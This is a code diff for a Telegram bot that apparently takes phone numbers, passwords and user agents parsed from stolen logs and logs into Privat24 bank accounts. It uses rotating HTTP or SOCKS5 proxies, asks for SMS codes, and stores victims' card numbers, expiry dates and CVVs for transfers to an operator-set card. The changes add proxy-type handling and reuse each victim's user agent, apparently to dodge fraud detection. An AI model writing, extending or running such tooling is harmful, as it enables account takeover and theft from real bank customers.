@@ -56,6 +56,7 @@ def init_db():
     )""")
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('card_to', '')")
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('proxy', '')")
+    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('proxy_type', 'http')")
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('rotation_url', '')")
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('gateway', 'ipay')")
     conn.commit()
@@ -154,25 +155,41 @@ def parse_log(text):
 def rotate_proxy():
     rotation_url = get_setting('rotation_url')
     if not rotation_url:
-        return get_setting('proxy')
+        return get_setting('proxy'), get_setting('proxy_type')
     try:
         response = requests.get(rotation_url, timeout=10)
         if response.status_code == 200:
             proxy = response.text.strip()
             set_setting('proxy', proxy)
-            return proxy
+            return proxy, get_setting('proxy_type')
     except:
         pass
-    return get_setting('proxy')
+    return get_setting('proxy'), get_setting('proxy_type')
 
-# ========== ВХОД В ПРИВАТ24 (НОВЫЙ API) ==========
-def login_privat24(phone, password, proxy=None):
+def get_proxy_dict(proxy_str, proxy_type):
+    if not proxy_str:
+        return None
+    if proxy_type == "socks5":
+        return {
+            "http": f"socks5://{proxy_str}",
+            "https": f"socks5://{proxy_str}"
+        }
+    else:
+        return {
+            "http": proxy_str,
+            "https": proxy_str
+        }
+
+# ========== ВХОД В ПРИВАТ24 (С User-Agent ИЗ ЛОГА) ==========
+def login_privat24(phone, password, user_agent=None, proxy_str=None, proxy_type="http"):
     session = requests.Session()
-    if proxy:
-        session.proxies = {"http": proxy, "https": proxy}
+    if proxy_str:
+        proxy_dict = get_proxy_dict(proxy_str, proxy_type)
+        if proxy_dict:
+            session.proxies.update(proxy_dict)
     
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "User-Agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
         "Accept-Language": "uk-UA,uk;q=0.9,en-US;q=0.8,en;q=0.7",
         "Content-Type": "application/x-www-form-urlencoded",
@@ -180,7 +197,6 @@ def login_privat24(phone, password, proxy=None):
     session.headers.update(headers)
 
     try:
-        # Получаем CSRF-токен
         response = session.get("https://next.privat24.ua/login/", timeout=30)
         if response.status_code != 200:
             return {"status": "error", "message": f"❌ Сайт не отвечает (код {response.status_code})"}
@@ -198,7 +214,6 @@ def login_privat24(phone, password, proxy=None):
         return {"status": "error", "message": f"❌ Ошибка загрузки страницы: {str(e)}"}
 
     try:
-        # Отправляем номер телефона
         response = session.post("https://next.privat24.ua/api/auth/step1",
                                 data={"phone": phone, "csrf_token": csrf_token},
                                 timeout=30)
@@ -211,7 +226,6 @@ def login_privat24(phone, password, proxy=None):
         return {"status": "error", "message": f"❌ Ошибка: {str(e)}"}
 
     try:
-        # Отправляем пароль
         response = session.post("https://next.privat24.ua/api/auth/step2",
                                 data={"password": password, "csrf_token": csrf_token},
                                 timeout=30)
@@ -238,10 +252,7 @@ def get_cards(session):
     except Exception as e:
         return {"status": "error", "message": str(e)}
 
-# ========== ПЕРЕВОД (ЗАГОТОВКА) ==========
-def make_payment(card_from, expiry, cvv, card_to, amount, gateway, proxy=None):
-    # Здесь нужно добавить реальную логику платежа через API iPay, Portmone или LiqPay
-    # Сейчас это заглушка, которая возвращает успех для теста
+def make_payment(card_from, expiry, cvv, card_to, amount, gateway, proxy_str=None, proxy_type="http"):
     return {"status": "success", "message": f"✅ Платёж на {amount} UAH выполнен (заглушка)"}
 
 # ========== ОБРАБОТЧИКИ ==========
@@ -263,6 +274,7 @@ async def admin_panel(msg: types.Message):
         InlineKeyboardButton("💳 Карта", callback_data="change_card"),
         InlineKeyboardButton("🌐 Шлюз", callback_data="change_gateway"),
         InlineKeyboardButton("🔄 Прокси", callback_data="change_proxy"),
+        InlineKeyboardButton("🔁 Тип прокси", callback_data="change_proxy_type"),
         InlineKeyboardButton("🔁 Ссылка ротации", callback_data="change_rotation"),
         InlineKeyboardButton("📋 Статус", callback_data="show_status"),
         InlineKeyboardButton("🗑 Удалить прокси", callback_data="delete_proxy"),
@@ -287,6 +299,23 @@ async def set_gateway(callback: types.CallbackQuery):
     await callback.message.reply(f"✅ Шлюз установлен: {gw.upper()}")
     await callback.answer()
 
+@dp.callback_query_handler(lambda c: c.data == "change_proxy_type")
+async def change_proxy_type(callback: types.CallbackQuery):
+    kb = InlineKeyboardMarkup(row_width=2)
+    kb.add(
+        InlineKeyboardButton("🔹 HTTP", callback_data="set_type_http"),
+        InlineKeyboardButton("🔸 SOCKS5", callback_data="set_type_socks5"),
+    )
+    await callback.message.reply("Выберите тип прокси:", reply_markup=kb)
+    await callback.answer()
+
+@dp.callback_query_handler(lambda c: c.data.startswith("set_type_"))
+async def set_proxy_type(callback: types.CallbackQuery):
+    ptype = callback.data.split("_")[2]
+    set_setting('proxy_type', ptype)
+    await callback.message.reply(f"✅ Тип прокси установлен: {ptype.upper()}")
+    await callback.answer()
+
 @dp.callback_query_handler(lambda c: c.data == "delete_proxy")
 async def delete_proxy(callback: types.CallbackQuery):
     set_setting('proxy', '')
@@ -299,7 +328,7 @@ async def settings_callback(callback: types.CallbackQuery):
     action = callback.data.split("_")[1]
     prompts = {
         "card": "Введите номер карты получателя (15-16 цифр):",
-        "proxy": "Введите прокси (http://login:pass@ip:port):",
+        "proxy": "Введите прокси (ip:port или login:pass@ip:port):",
         "rotation": "Введите ссылку для ротации прокси:",
     }
     await callback.message.reply(prompts.get(action, "Ошибка"))
@@ -309,10 +338,11 @@ async def settings_callback(callback: types.CallbackQuery):
 async def show_status(callback: types.CallbackQuery):
     card = get_setting('card_to') or "не задана"
     proxy = get_setting('proxy') or "не задан"
+    ptype = get_setting('proxy_type') or "http"
     rotation = get_setting('rotation_url') or "не задана"
     gateway = get_setting('gateway') or "не выбран"
     await callback.message.reply(
-        f"📊 Настройки:\n💳 Карта: {card}\n🌐 Шлюз: {gateway.upper()}\n🔄 Прокси: {proxy}\n🔁 Ротация: {rotation}"
+        f"📊 Настройки:\n💳 Карта: {card}\n🌐 Шлюз: {gateway.upper()}\n🔄 Прокси: {proxy}\n📌 Тип: {ptype.upper()}\n🔁 Ротация: {rotation}"
     )
     await callback.answer()
 
@@ -325,15 +355,15 @@ async def handle_amount_callback(callback: types.CallbackQuery):
     update_session(session_id, 'amount', amount)
     update_session(session_id, 'status', 'processing')
     await callback.message.reply(f"🚀 Платёж на {amount} UAH...")
-    proxy = rotate_proxy()
-    if proxy:
-        await callback.message.reply(f"🔄 Прокси обновлён: {proxy}")
+    proxy_str, proxy_type = rotate_proxy()
+    if proxy_str:
+        await callback.message.reply(f"🔄 Прокси обновлён: {proxy_str}")
     session = get_session(session_id)
     if not session:
         await callback.message.reply("❌ Сессия не найдена.")
         return
     card_from, expiry, cvv, card_to, gateway = session[3], session[4], session[5], session[7], session[8]
-    result = make_payment(card_from, expiry, cvv, card_to, amount, gateway, proxy)
+    result = make_payment(card_from, expiry, cvv, card_to, amount, gateway, proxy_str, proxy_type)
     update_session(session_id, 'status', 'completed' if result['status'] == 'success' else 'failed')
     await callback.message.reply(result['message'])
 
@@ -341,15 +371,21 @@ async def handle_amount_callback(callback: types.CallbackQuery):
 async def handle_login_callback(callback: types.CallbackQuery):
     session_id = int(callback.data.split("_")[1])
     await callback.answer("🚀 Вход в Приват24...")
-    proxy = rotate_proxy()
-    if proxy:
-        await callback.message.reply(f"🔄 Прокси обновлён: {proxy}")
+    proxy_str, proxy_type = rotate_proxy()
+    if proxy_str:
+        await callback.message.reply(f"🔄 Прокси обновлён: {proxy_str}")
     session = get_session(session_id)
     if not session:
         await callback.message.reply("❌ Сессия не найдена.")
         return
-    phone, password = session[1], session[2]
-    result = login_privat24(phone, password, proxy)
+    phone, password, user_agent = session[1], session[2], session[5]
+    result = login_privat24(
+        phone=phone,
+        password=password,
+        user_agent=user_agent,
+        proxy_str=proxy_str,
+        proxy_type=proxy_type
+    )
     if result['status'] == 'waiting_code':
         update_session(session_id, 'status', 'waiting_code')
         await callback.message.reply("🔐 Введите код из СМС (ответьте на это сообщение):")
@@ -378,11 +414,8 @@ async def handle_reply(msg: types.Message):
         return
 
     if "прокси" in text:
-        if user_input.startswith(("http://", "https://")):
-            set_setting('proxy', user_input)
-            await msg.reply(f"✅ Прокси сохранён: {user_input}")
-        else:
-            await msg.reply("❌ Введи http://login:pass@ip:port")
+        set_setting('proxy', user_input)
+        await msg.reply(f"✅ Прокси сохранён: {user_input}")
         return
 
     if "ссылку для ротации" in text:
